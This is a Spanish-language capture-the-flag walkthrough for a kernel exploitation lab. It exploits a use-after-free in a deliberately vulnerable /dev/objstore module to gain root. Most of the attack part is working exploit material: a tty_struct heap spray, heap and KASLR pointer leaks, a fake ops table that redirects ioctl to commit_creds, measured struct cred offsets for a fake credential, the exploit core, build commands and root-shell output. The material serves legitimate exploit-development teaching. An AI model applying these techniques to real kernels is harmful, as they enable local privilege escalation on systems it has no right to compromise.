# CH03 — Object Store: use-after-free con spray de tty y cred falso

**Nivel recomendado:** 3 (SMEP + KASLR + SMAP)
**Dispositivo:** `/dev/objstore` (`ioctl`: create / read / write / delete)
**Concepto nuevo:** UAF sobre un objeto de kmalloc-1024, reclamarlo con `tty_struct`, leer punteros para romper KASLR y heap, y usar la propia tty como `struct cred` falso para no depender de ROP.

---

## Objetivo

`uid=0(root)` y leer `/root/flag.txt`. En el nivel 3 hay SMAP: el kernel no puede tocar memoria de usuario, así que el exploit no puede poner datos en su propio espacio de direcciones y usarlos desde ring 0.

---

## Paso 1: el bug

Lee `src/ch03-object-store/vuln_objstore.c`. En `CMD_DELETE`:

```c
kfree(objects[idx]);
/* BUG: pointer NOT set to NULL after free. */
```

El puntero del slot sigue apuntando a memoria liberada. Después, `CMD_READ` y `CMD_WRITE` operan sobre esa memoria. Es un **use-after-free** clásico.

Los objetos miden 1024 bytes y salen de `kmalloc-1024`, la misma caché que `tty_struct`. Si otro objeto ocupa el hueco, la lectura y la escritura afectan a ese objeto.

---

## Paso 2: reclamar el hueco con una tty

Abrir `/dev/ptmx` crea una `tty_struct` por fd. Así que:

```c
io.idx = 0; io.size = 1024;
ioctl(obj, CMD_CREATE, &io);
ioctl(obj, CMD_DELETE, 0UL);            /* kfree, el puntero queda colgando */
for (i = 0; i < 64; i++)
    fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);   /* spray */
```

Ahora `CMD_READ` sobre el índice 0 devuelve el contenido de una `tty_struct` viva.

---

## Paso 3: leer el heap

Una `tty_struct` contiene listas enlazadas vacías (por ejemplo, `ldisc_sem.wait_list`). Una lista vacía apunta a sí misma: sus dos punteros (`next` y `prev`) valen la dirección de la propia cabeza, es decir, la dirección del objeto más su desplazamiento.

Buscamos dos palabras iguales cuyo valor, módulo 1024, coincide con su desplazamiento dentro del objeto:

```c
if (a == b && (a >> 48) == 0xffff && (a & 0x3ff) == i * 8)
    heap = a - i * 8;     /* dirección base del objeto */
```

Como los objetos de kmalloc-1024 están alineados a 1024, el resto de la división nos da el desplazamiento.

---

## Paso 4: leer KASLR

En `tty_struct`, el campo `ops` (offset `0x18`) apunta a una tabla de funciones en la sección `.data` del kernel. Para `/dev/ptmx` es `ptm_unix98_ops`:

```
ops = 0xffffffffb7e81b00
ptm_unix98_ops (vmlinux) = 0xffffffff82281b00
KASLR = ops − link = 0x35c00000
```

El desplazamiento es múltiplo de 2 MB, así que la comprobación `(kaslr & 0x1fffff) == 0` filtra falsos positivos.

---

## Paso 5: por qué no hace falta ROP ni pivote

Con SMAP no podemos poner la cadena en memoria de usuario. Pero el objeto está **en el heap del kernel**, y sabemos su dirección. Podemos escribir en él con `CMD_WRITE`.

Ahora mira `tty_ioctl` (`objdump -d vmlinux`). Para un `cmd` desconocido, el kernel hace:

```
mov  0x18(%rbp),%rax     ; rbp = tty; ops = tty->ops
mov  0x60(%rax),%rax     ; ops->ioctl
mov  %r12,%rdx           ; arg
mov  %ebx,%esi           ; cmd
mov  %rbp,%rdi           ; rdi = tty
call *%rax
```

Podemos hacer tres cosas:

1. Poner `ops` en una tabla falsa dentro del mismo objeto, con `ioctl = commit_creds`.
2. Como `rdi` es la `tty` (es decir, nuestro objeto), `commit_creds(rdi)` recibe **un puntero a nuestro propio objeto**. Si ese objeto tiene el layout de un `struct cred`, el kernel lo adopta como credencial del proceso.
3. No hace falta volver a ring 3 con `iretq`: `commit_creds` devuelve y la ejecución sigue en el proceso como root.

---

## Paso 6: el cred falso

El layout de `struct cred` depende de la configuración exacta del kernel. No lo adivines: mídelo. Este módulo mínimo imprime los offsets como constantes en `.rodata`:

```c
#include <linux/cred.h>
#include <linux/stddef.h>
const unsigned long cred_offs[] = {
    offsetof(struct cred, uid), offsetof(struct cred, euid),
    offsetof(struct cred, cap_effective), offsetof(struct cred, user),
    offsetof(struct cred, ucounts), offsetof(struct cred, group_info),
    /* ... */
};
```

Compílalo contra el árbol de kernel (`make M=... modules`) y vuelca `.rodata` con `objdump -s`. Un error de 4 bytes aquí cuesta un crash: el `kernel_cap_t` está alineado a 4 bytes, así que los campos de capacidades empiezan en `0x2c`, no en `0x30`.

Offsets medidos en este build (`cred` total 176 bytes):

| Campo | Offset | Qué ponemos |
|---|---|---|
| `usage` | `0x00` | `0x100000` (nunca llega a 0) |
| `uid` / `gid` | `0x08` / `0x0c` | 0 |
| `suid` / `sgid` | `0x10` / `0x14` | **se conservan**: son el puntero `driver` de la tty |
| `euid` / `egid` | `0x18` / `0x1c` | **puntero a la tabla falsa**: es el campo `ops` de la tty |
| `fsuid` / `fsgid` | `0x20` / `0x24` | 0 (los permisos de archivos usan esto) |
| `cap_permitted` | `0x34` | `0x1ffffffffff` |
| `cap_effective` | `0x3c` | `0x1ffffffffff` |
| `cap_bset` | `0x44` | `0x1ffffffffff` |
| `security` | `0x78` | puntero a bloque vacío dentro del objeto |
| `user` | `0x80` | `&root_user` |
| `user_ns` | `0x88` | `&init_user_ns` |
| `ucounts` | `0x90` | `&init_ucounts` |
| `group_info` | `0x98` | `&init_groups` |

Los campos `suid/sgid` y `euid/egid` solapan con los punteros de la tty que el kernel lee antes de llamar a `ioctl`. Por eso se conservan `driver` y se pone `ops` en `euid/egid`. Como consecuencia, **el `euid` del proceso queda con basura** (`euid=33179136` en la salida). El kernel usa `uid`, `fsuid` y las capacidades para decidir, así que el resultado es root funcional.

Los punteros que el kernel desreferencia dentro de `commit_creds` (`user`, `ucounts`, `group_info`) apuntan a símbolos reales, con el KASLR sumado.

---

## Paso 7: el exploit

Código completo en [`ch03-object-store/exploit.c`](ch03-object-store/exploit.c). Núcleo:

```c
memcpy(out, img, OBJ_SIZE);                    /* partir de la tty real */
put_qw(out, 0x00, 0x100000UL);                 /* usage */
put_qw(out, 0x18, heap + FAKE_OPS_OFF);        /* ops falsa */
/* ... cred en 0x00..0xa0 ... */
put_qw(out, FAKE_OPS_OFF + 0x60, LINK_COMMIT_CREDS + kaslr);   /* ioctl */

ioctl(obj, CMD_WRITE, &io);                    /* sobrescribir la tty */
for (i = 0; i < 64; i++)
    ioctl(fds[i], 0x1234, 0UL);                /* solo la falsa llama a commit_creds */
```

Solo la tty sobrescrita tiene la tabla falsa. Las demás llaman a su `ioctl` real, que devuelve `-ENOIOCTLCMD`.

Compilar y ejecutar:

```bash
gcc -static -O0 -fno-stack-protector -o exploit exploit.c
cp exploit ../challenges/ch03-object-store/shared/
cd ../challenges/ch03-object-store && ./run.sh 3
```

Dentro de la VM:

```
~ $ /shared/exploit
[*] heap base del objeto = 0xffff904e01fa4400
[*] ops = 0xffffffffa5e81b00  KASLR = 0x23c00000
[*] uid=0 euid=28984832 fsuid=0
[+] root conseguido
[+] flag: FLAG{...}
~ # id
uid=0(root) gid=0(root) euid=33179136 egid=4294943209
```

---

## Problemas que encontramos (y cómo se resolvieron)

| Síntoma | Causa | Solución |
|---|---|---|
| Oops en `inc_rlimit_ucounts` | Offsets de `cred` adivinados; `ucounts` leía `init_user_ns` | Medir offsets con `offsetof` |
| Sin shell tras la escalada, sin error | `FD_CLOEXEC` cierra las ptmx en el `exec`; `tty_release` sobre el objeto que ahora es el cred falso | No cerrar esos fds: dejarlos abiertos durante el `exec` |
| `commit_creds` no escala | `cred` no alineado con los punteros de la tty que se leen antes del `ioctl` | Conservar `driver` y colocar `ops` en `euid/egid` |

---

## Qué aprendiste

- Un UAF sobre una caché compartida se convierte en lectura y escritura cuando otro objeto ocupa el hueco.
- Las listas enlazadas vacías son una fuente fiable de punteros de heap.
- Con SMAP, la pila de ROP no puede venir de userland, pero **cualquier objeto del heap del kernel vale como memoria controlada**.
- Un puntero de función recibe argumentos controlados (`rdi = tty`), y eso basta para llamar a `commit_creds` con un cred falso.
- Medir layouts de estructuras en vez de suponerlos.

**Anterior:** [CH02](ch02-echo-chamber-v2.md) · **Siguiente:** CH04 (pendiente de guía).
